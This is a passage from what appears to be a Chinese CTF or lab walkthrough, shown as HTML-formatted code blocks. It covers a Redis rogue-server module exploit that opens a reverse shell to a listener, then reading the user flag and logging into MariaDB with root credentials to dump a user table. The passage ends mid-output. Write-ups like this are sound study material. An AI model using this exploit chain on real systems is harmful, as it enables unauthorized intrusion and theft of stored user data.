+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">472</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> /bin/bash</span><span style="color:#24292E"> </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">471</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> python3</span><span style="color:#005CC5"> -c</span><span style="color:#032F62"> import</span><span style="color:#032F62"> pty</span><span style="color:#24292E">;</span><span style="color:#6F42C1">pty.spawn(</span><span style="color:#6F42C1">'/bin/bash'</span><span style="color:#24292E">) </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">470</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> php-fpm:</span><span style="color:#032F62"> pool</span><span style="color:#032F62"> www</span><span style="color:#24292E">                  </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">469</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> sh</span><span style="color:#005CC5"> -i</span><span style="color:#24292E"> </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">465</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> sh</span><span style="color:#005CC5"> -c</span><span style="color:#032F62"> uname</span><span style="color:#005CC5"> -a</span><span style="color:#24292E">; </span><span style="color:#6F42C1">w</span><span style="color:#24292E">; </span><span style="color:#6F42C1">id</span><span style="color:#24292E">; </span><span style="color:#6F42C1">sh</span><span style="color:#005CC5"> -i</span><span style="color:#24292E"> </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">403</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> php-fpm:</span><span style="color:#032F62"> pool</span><span style="color:#032F62"> www</span><span style="color:#24292E">                  </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">32</span><span style="color:#D73A49">     |</span><span style="color:#6F42C1"> ./frpc</span><span style="color:#005CC5"> -c</span><span style="color:#032F62"> frps.ini</span><span style="color:#24292E"> </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">30</span><span style="color:#D73A49">     |</span><span style="color:#6F42C1"> /bin/bash</span><span style="color:#24292E"> </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">29</span><span style="color:#D73A49">     |</span><span style="color:#6F42C1"> python3</span><span style="color:#005CC5"> -c</span><span style="color:#032F62"> import</span><span style="color:#032F62"> pty</span><span style="color:#24292E">;</span><span style="color:#6F42C1">pty.spawn(</span><span style="color:#6F42C1">'/bin/bash'</span><span style="color:#24292E">) </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">28</span><span style="color:#D73A49">     |</span><span style="color:#6F42C1"> sh</span><span style="color:#005CC5"> -i</span><span style="color:#24292E"> </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">24</span><span style="color:#D73A49">     |</span><span style="color:#6F42C1"> sh</span><span style="color:#005CC5"> -c</span><span style="color:#032F62"> uname</span><span style="color:#005CC5"> -a</span><span style="color:#24292E">; </span><span style="color:#6F42C1">w</span><span style="color:#24292E">; </span><span style="color:#6F42C1">id</span><span style="color:#24292E">; </span><span style="color:#6F42C1">sh</span><span style="color:#005CC5"> -i</span><span style="color:#24292E"> </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">15</span><span style="color:#D73A49">     |</span><span style="color:#6F42C1"> php-fpm:</span><span style="color:#032F62"> pool</span><span style="color:#032F62"> www</span><span style="color:#24292E">                  </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">14</span><span style="color:#D73A49">     |</span><span style="color:#6F42C1"> php-fpm:</span><span style="color:#032F62"> pool</span><span style="color:#032F62"> www</span><span style="color:#24292E">                  </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">33</span><span style="color:#032F62">    PID=</span><span style="color:#005CC5">9</span><span style="color:#D73A49">      |</span><span style="color:#6F42C1"> nginx:</span><span style="color:#032F62"> worker</span><span style="color:#032F62"> process</span><span style="color:#24292E">          </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">0</span><span style="color:#032F62">     PID=</span><span style="color:#005CC5">8</span><span style="color:#D73A49">      |</span><span style="color:#6F42C1"> php-fpm:</span><span style="color:#032F62"> master</span><span style="color:#032F62"> process</span><span style="color:#24292E"> (/etc/php/7.4/fpm/php-fpm.conf) </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">0</span><span style="color:#032F62">     PID=</span><span style="color:#005CC5">7</span><span style="color:#D73A49">      |</span><span style="color:#6F42C1"> nginx:</span><span style="color:#032F62"> master</span><span style="color:#032F62"> process</span><span style="color:#032F62"> /usr/sbin/nginx</span><span style="color:#005CC5"> -g</span><span style="color:#032F62"> daemon</span><span style="color:#032F62"> off</span><span style="color:#24292E">; </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">101</span><span style="color:#032F62">   PID=</span><span style="color:#005CC5">6</span><span style="color:#D73A49">      |</span><span style="color:#6F42C1"> /usr/sbin/mariadbd</span><span style="color:#24292E"> </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 10:59:33</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">0</span><span style="color:#032F62">     PID=</span><span style="color:#005CC5">1</span><span style="color:#D73A49">      |</span><span style="color:#6F42C1"> /usr/bin/python3</span><span style="color:#032F62"> /usr/bin/supervisord</span><span style="color:#005CC5"> -c</span><span style="color:#032F62"> /etc/supervisord.conf</span><span style="color:#24292E"> </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 11:00:01</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">0</span><span style="color:#032F62">     PID=</span><span style="color:#005CC5">768</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> runc</span><span style="color:#032F62"> init</span><span style="color:#24292E"> </span></span>
+<span class="line"><span style="color:#6F42C1">2025/07/12</span><span style="color:#032F62"> 11:00:01</span><span style="color:#032F62"> CMD:</span><span style="color:#032F62"> UID=</span><span style="color:#005CC5">0</span><span style="color:#032F62">     PID=</span><span style="color:#005CC5">773</span><span style="color:#D73A49">    |</span><span style="color:#6F42C1"> rm</span><span style="color:#005CC5"> -fv</span><span style="color:#032F62"> /var/www/html/exp.so</span><span style="color:#24292E"> </span></span></code></pre>
+<p>要注意服务器会定时删除so后缀的文件，将exp.so名称成一个没有后缀的文件就行</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6F42C1">www-data@0bb9bcb43160:/tmp$</span><span style="color:#032F62"> python3</span><span style="color:#032F62"> 1.py</span><span style="color:#005CC5"> --rhost</span><span style="color:#005CC5"> 172.19.0.2</span><span style="color:#005CC5"> --lhost</span><span style="color:#005CC5"> 172.19.0.3</span></span>
+<span class="line"><span style="color:#D73A49">&#x3C;</span><span style="color:#24292E"> python3 1.py --rhost 172.19.0.2 --lhost 172.19.0.3</span></span>
+<span class="line"><span style="color:#6F42C1">______</span><span style="color:#032F62">         _</span><span style="color:#032F62"> _</span><span style="color:#032F62">      ______</span><span style="color:#032F62">                         _____</span><span style="color:#24292E">                          </span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> ___</span><span style="color:#005CC5"> \ </span><span style="color:#D73A49">      |</span><span style="color:#24292E"> (</span><span style="color:#6F42C1">_</span><span style="color:#24292E">)     </span><span style="color:#D73A49">|</span><span style="color:#6F42C1"> ___</span><span style="color:#005CC5"> \ </span><span style="color:#032F62">                      /</span><span style="color:#032F62">  ___</span><span style="color:#D73A49">|</span><span style="color:#24292E">                         </span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">_/</span><span style="color:#032F62"> /___</span><span style="color:#032F62">  __</span><span style="color:#D73A49">|</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">_</span><span style="color:#032F62"> ___</span><span style="color:#D73A49">  |</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">_/</span><span style="color:#032F62"> /___</span><span style="color:#032F62">   __</span><span style="color:#032F62"> _</span><span style="color:#032F62"> _</span><span style="color:#032F62">   _</span><span style="color:#032F62">  ___</span><span style="color:#005CC5">  \ </span><span style="color:#032F62">`</span><span style="color:#6F42C1">--.</span><span style="color:#032F62">  ___ _ ____   _____ _ __ </span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1">    //</span><span style="color:#032F62"> _ </span><span style="color:#005CC5">\/</span><span style="color:#032F62"> _`</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> /</span><span style="color:#032F62"> __</span><span style="color:#D73A49">|</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">    //</span><span style="color:#032F62"> _</span><span style="color:#005CC5"> \ </span><span style="color:#032F62">/</span><span style="color:#032F62"> _` </span><span style="color:#D73A49">|</span><span style="color:#D73A49"> |</span><span style="color:#D73A49"> |</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">/</span><span style="color:#032F62"> _ </span><span style="color:#005CC5">\ </span><span style="color:#032F62"> `</span><span style="color:#6F42C1">--.</span><span style="color:#005CC5"> \/</span><span style="color:#032F62"> _</span><span style="color:#005CC5"> \ </span><span style="color:#032F62">'__\ \ / / _ \ '__</span><span style="color:#D73A49">|</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">\</span><span style="color:#005CC5"> \ </span><span style="color:#032F62"> __/</span><span style="color:#24292E"> (_</span><span style="color:#D73A49">|</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> \__</span><span style="color:#005CC5"> \ </span><span style="color:#D73A49">|</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">\</span><span style="color:#005CC5"> \ </span><span style="color:#24292E">(</span><span style="color:#6F42C1">_</span><span style="color:#24292E">) </span><span style="color:#D73A49">|</span><span style="color:#24292E"> (</span><span style="color:#6F42C1">_</span><span style="color:#D73A49">|</span><span style="color:#D73A49"> |</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">_</span><span style="color:#D73A49">|</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">  __/</span><span style="color:#032F62"> /</span><span style="color:#005CC5">\_</span><span style="color:#032F62">_/</span><span style="color:#032F62"> /</span><span style="color:#032F62">  __/</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">   \</span><span style="color:#032F62"> V</span><span style="color:#032F62"> /</span><span style="color:#032F62">  __/</span><span style="color:#D73A49"> |</span><span style="color:#24292E">   </span></span>
+<span class="line"><span style="color:#6F42C1">\_</span><span style="color:#D73A49">|</span><span style="color:#6F42C1"> \_\___</span><span style="color:#D73A49">|</span><span style="color:#6F42C1">\__,_</span><span style="color:#D73A49">|</span><span style="color:#6F42C1">_</span><span style="color:#D73A49">|</span><span style="color:#6F42C1">___/</span><span style="color:#005CC5"> \_</span><span style="color:#D73A49">|</span><span style="color:#6F42C1"> \_\___/</span><span style="color:#005CC5"> \_</span><span style="color:#032F62">_,</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">\__,_</span><span style="color:#D73A49">|</span><span style="color:#6F42C1">\___</span><span style="color:#D73A49">|</span><span style="color:#6F42C1"> \____/</span><span style="color:#005CC5"> \_</span><span style="color:#032F62">__</span><span style="color:#D73A49">|</span><span style="color:#6F42C1">_</span><span style="color:#D73A49">|</span><span style="color:#6F42C1">    \_/</span><span style="color:#005CC5"> \_</span><span style="color:#032F62">__</span><span style="color:#D73A49">|</span><span style="color:#6F42C1">_</span><span style="color:#D73A49">|</span><span style="color:#24292E">   </span></span>
+<span class="line"><span style="color:#6F42C1">                                     __/</span><span style="color:#D73A49"> |</span><span style="color:#24292E">                                            </span></span>
+<span class="line"><span style="color:#D73A49">                                    |</span><span style="color:#6F42C1">___/</span><span style="color:#24292E">                                             </span></span>
+<span class="line"><span style="color:#6F42C1">@copyright</span><span style="color:#032F62"> n0b0dy</span><span style="color:#032F62"> @</span><span style="color:#032F62"> r3kapig</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">[info] TARGET 172.19.0.2:6379</span></span>
+<span class="line"><span style="color:#24292E">[info] SERVER 172.19.0.3:21000</span></span>
+<span class="line"><span style="color:#24292E">[info] Setting master...</span></span>
+<span class="line"><span style="color:#24292E">[info] Setting dbfilename...</span></span>
+<span class="line"><span style="color:#24292E">[info] Loading module...</span></span>
+<span class="line"><span style="color:#24292E">[info] Temerory cleaning up...</span></span>
+<span class="line"><span style="color:#6F42C1">What</span><span style="color:#032F62"> do</span><span style="color:#032F62"> u</span><span style="color:#032F62"> want,</span><span style="color:#24292E"> [i]nteractive shell or [r]everse shell: r</span></span>
+<span class="line"><span style="color:#6F42C1">r</span></span>
+<span class="line"><span style="color:#24292E">[info] Open reverse shell...</span></span>
+<span class="line"><span style="color:#6F42C1">Reverse</span><span style="color:#032F62"> server</span><span style="color:#032F62"> address:</span><span style="color:#005CC5"> 172.19.0.3</span></span>
+<span class="line"><span style="color:#6F42C1">172.19.0.3</span></span>
+<span class="line"><span style="color:#6F42C1">Reverse</span><span style="color:#032F62"> server</span><span style="color:#032F62"> port:</span><span style="color:#005CC5"> 5555</span></span>
+<span class="line"><span style="color:#6F42C1">5555</span></span>
+<span class="line"><span style="color:#24292E">[info] Reverse shell payload sent.</span></span>
+<span class="line"><span style="color:#24292E">[info] Check at 172.19.0.3:5555</span></span>
+<span class="line"><span style="color:#24292E">[info] Unload module...</span></span>
+<span class="line"><span style="color:#24292E">   </span></span>
+<span class="line"><span style="color:#6F42C1">$</span><span style="color:#032F62"> python3</span><span style="color:#032F62"> s.py</span></span>
+<span class="line"><span style="color:#6F42C1">Usage:</span><span style="color:#032F62"> s.py</span><span style="color:#D73A49"> &#x3C;</span><span style="color:#032F62">listen_por</span><span style="color:#24292E">t</span><span style="color:#D73A49">></span></span>
+<span class="line"><span style="color:#6F42C1">$</span><span style="color:#032F62"> python3</span><span style="color:#032F62"> s.py</span><span style="color:#005CC5"> 5555</span></span>
+<span class="line"><span style="color:#6F42C1">id</span></span>
+<span class="line"><span style="color:#6F42C1">Listening</span><span style="color:#032F62"> on</span><span style="color:#032F62"> 0.0.0.0:5555</span><span style="color:#032F62"> ...</span></span>
+<span class="line"><span style="color:#6F42C1">Connection</span><span style="color:#032F62"> from</span><span style="color:#032F62"> 172.19.0.2:56334</span><span style="color:#032F62"> established!</span></span>
+<span class="line"><span style="color:#24292E">uid</span><span style="color:#D73A49">=</span><span style="color:#032F62">999</span><span style="color:#24292E">(</span><span style="color:#6F42C1">redis</span><span style="color:#24292E">) gid</span><span style="color:#D73A49">=</span><span style="color:#032F62">999</span><span style="color:#24292E">(</span><span style="color:#6F42C1">redis</span><span style="color:#24292E">) groups</span><span style="color:#D73A49">=</span><span style="color:#032F62">999</span><span style="color:#24292E">(</span><span style="color:#6F42C1">redis</span><span style="color:#24292E">)</span></span></code></pre>
+<p>成获取redis权限</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6F42C1">cat</span><span style="color:#032F62"> /opt/user.txt</span></span>
+<span class="line"><span style="color:#6F42C1">flag</span><span style="color:#032F62">{user-4f6311d4cf5776f0316c2f1b6526a653}</span></span></code></pre>
+<h2 id="提权">提权</h2>
+<p>根据bamuwe的提示，查看web主机的数据库</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6F42C1">www-data@0bb9bcb43160:/tmp$</span><span style="color:#032F62"> mysql</span><span style="color:#005CC5"> -uroot</span><span style="color:#005CC5"> -proot</span></span>
+<span class="line"><span style="color:#6F42C1">mysql</span><span style="color:#005CC5"> -uroot</span><span style="color:#005CC5"> -proot</span></span>
+<span class="line"><span style="color:#6F42C1">Welcome</span><span style="color:#032F62"> to</span><span style="color:#032F62"> the</span><span style="color:#032F62"> MariaDB</span><span style="color:#032F62"> monitor.</span><span style="color:#032F62">  Commands</span><span style="color:#032F62"> end</span><span style="color:#032F62"> with</span><span style="color:#24292E"> ; </span><span style="color:#6F42C1">or</span><span style="color:#005CC5"> \g</span><span style="color:#032F62">.</span></span>
+<span class="line"><span style="color:#6F42C1">Your</span><span style="color:#032F62"> MariaDB</span><span style="color:#032F62"> connection</span><span style="color:#032F62"> id</span><span style="color:#032F62"> is</span><span style="color:#005CC5"> 7</span></span>
+<span class="line"><span style="color:#6F42C1">Server</span><span style="color:#032F62"> version:</span><span style="color:#032F62"> 10.5.29-MariaDB-0+deb11u1</span><span style="color:#032F62"> Debian</span><span style="color:#005CC5"> 11</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6F42C1">Copyright</span><span style="color:#24292E"> (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6F42C1">Type</span><span style="color:#032F62"> 'help;'</span><span style="color:#032F62"> or</span><span style="color:#032F62"> '\h'</span><span style="color:#032F62"> for</span><span style="color:#032F62"> help.</span><span style="color:#032F62"> Type</span><span style="color:#032F62"> '\c'</span><span style="color:#032F62"> to</span><span style="color:#032F62"> clear</span><span style="color:#032F62"> the</span><span style="color:#032F62"> current</span><span style="color:#032F62"> input</span><span style="color:#032F62"> statement.</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6F42C1">MariaDB</span><span style="color:#24292E"> [(none)]</span><span style="color:#D73A49">></span><span style="color:#24292E"> show databases;</span></span>
+<span class="line"><span style="color:#6F42C1">show</span><span style="color:#032F62"> databases</span><span style="color:#24292E">;                                                                                                                                                </span></span>
+<span class="line"><span style="color:#6F42C1">+--------------------+</span><span style="color:#24292E">                                                                                                                                         </span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> Database</span><span style="color:#D73A49">           |</span><span style="color:#24292E">                                                                                                                                         </span></span>
+<span class="line"><span style="color:#6F42C1">+--------------------+</span><span style="color:#24292E">                                                                                                                                         </span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> hnymwl_com_utf8</span><span style="color:#D73A49">    |</span><span style="color:#24292E">                                                                                                                                         </span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> information_schema</span><span style="color:#D73A49"> |</span><span style="color:#24292E">                                                                                                                                                       </span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> mysql</span><span style="color:#D73A49">              |</span><span style="color:#24292E">                                                                                                                                                       </span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> performance_schema</span><span style="color:#D73A49"> |</span></span>
+<span class="line"><span style="color:#6F42C1">+--------------------+</span></span>
+<span class="line"><span style="color:#6F42C1">4</span><span style="color:#032F62"> rows</span><span style="color:#032F62"> in</span><span style="color:#032F62"> set</span><span style="color:#24292E"> (0.000 </span><span style="color:#032F62">sec</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6F42C1">MariaDB</span><span style="color:#24292E"> [(none)]</span><span style="color:#D73A49">></span><span style="color:#24292E"> use hnymwl_com_utf8;</span></span>
+<span class="line"><span style="color:#6F42C1">use</span><span style="color:#032F62"> hnymwl_com_utf8</span><span style="color:#24292E">;</span></span>
+<span class="line"><span style="color:#6F42C1">Reading</span><span style="color:#032F62"> table</span><span style="color:#032F62"> information</span><span style="color:#032F62"> for</span><span style="color:#032F62"> completion</span><span style="color:#032F62"> of</span><span style="color:#032F62"> table</span><span style="color:#032F62"> and</span><span style="color:#032F62"> column</span><span style="color:#032F62"> names</span></span>
+<span class="line"><span style="color:#6F42C1">You</span><span style="color:#032F62"> can</span><span style="color:#032F62"> turn</span><span style="color:#032F62"> off</span><span style="color:#032F62"> this</span><span style="color:#032F62"> feature</span><span style="color:#032F62"> to</span><span style="color:#032F62"> get</span><span style="color:#032F62"> a</span><span style="color:#032F62"> quicker</span><span style="color:#032F62"> startup</span><span style="color:#032F62"> with</span><span style="color:#005CC5"> -A</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6F42C1">Database</span><span style="color:#032F62"> changed</span></span>
+<span class="line"><span style="color:#6F42C1">MariaDB</span><span style="color:#24292E"> [hnymwl_com_utf8]</span><span style="color:#D73A49">></span><span style="color:#24292E"> show tables;</span></span>
+<span class="line"><span style="color:#6F42C1">show</span><span style="color:#032F62"> tables</span><span style="color:#24292E">;</span></span>
+<span class="line"><span style="color:#6F42C1">+---------------------------+</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> Tables_in_hnymwl_com_utf8</span><span style="color:#D73A49"> |</span></span>
+<span class="line"><span style="color:#6F42C1">+---------------------------+</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> codepay_order</span><span style="color:#D73A49">             |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> codepay_user</span><span style="color:#D73A49">              |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> sdad3135</span><span style="color:#D73A49">                  |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_allot</span><span style="color:#D73A49">                  |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_area</span><span style="color:#D73A49">                   |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_balance</span><span style="color:#D73A49">                |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_bankcard</span><span style="color:#D73A49">               |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_bankinfo</span><span style="color:#D73A49">               |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_banks</span><span style="color:#D73A49">                  |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_cardinfo</span><span style="color:#D73A49">               |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_catproduct</span><span style="color:#D73A49">             |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_conf</span><span style="color:#D73A49">                   |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_config</span><span style="color:#D73A49">                 |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_gg</span><span style="color:#D73A49">                     |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_integral</span><span style="color:#D73A49">               |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_klinedata</span><span style="color:#D73A49">              |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_newsclass</span><span style="color:#D73A49">              |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_newsinfo</span><span style="color:#D73A49">               |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_opentime</span><span style="color:#D73A49">               |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_order</span><span style="color:#D73A49">                  |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_order_log</span><span style="color:#D73A49">              |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_payment</span><span style="color:#D73A49">                |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_price_log</span><span style="color:#D73A49">              |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_productclass</span><span style="color:#D73A49">           |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_productdata</span><span style="color:#D73A49">            |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_productinfo</span><span style="color:#D73A49">            |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_refundlog</span><span style="color:#D73A49">              |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_risk</span><span style="color:#D73A49">                   |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_usercode</span><span style="color:#D73A49">               |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_userinfo</span><span style="color:#D73A49">               |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_webconfig</span><span style="color:#D73A49">              |</span></span>
+<span class="line"><span style="color:#D73A49">|</span><span style="color:#6F42C1"> wp_wechat</span><span style="color:#D73A49">                 |</span></span>
+<span class="line"><span style="color:#6F42C1">+---------------------------+</span></span>
+<span class="line"><span style="color:#6F42C1">32</span><span style="color:#032F62"> rows</span><span style="color:#032F62"> in</span><span style="color:#032F62"> set</span><span style="color:#24292E"> (0.001 </span><span style="color:#032F62">sec</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6F42C1">MariaDB</span><span style="color:#24292E"> [hnymwl_com_utf8]</span><span style="color:#D73A49">></span><span style="color:#D73A49"> select</span><span style="color:#24292E"> * from wp_userinfo;</span></span>
+<span class="line"><span style="color:#24292E">s</span><span style="color:#032F62">elect</span><span style="color:#005CC5"> *</span><span style="color:#032F62"> from</span><span style="color:#032F62"> wp_userinfo</span><span style="color:#24292E">;</span></span>
+<span class="line"><span style="color:#6F42C1">+------+-------------+----------------------------------+-------------+------------+-----------+-------+---------+---------+---------+----------+------------+-------------+---------+--------+--------+-----------+----------+--------+--------+-----------+------------+-----------+-----------+----------+</span></span>
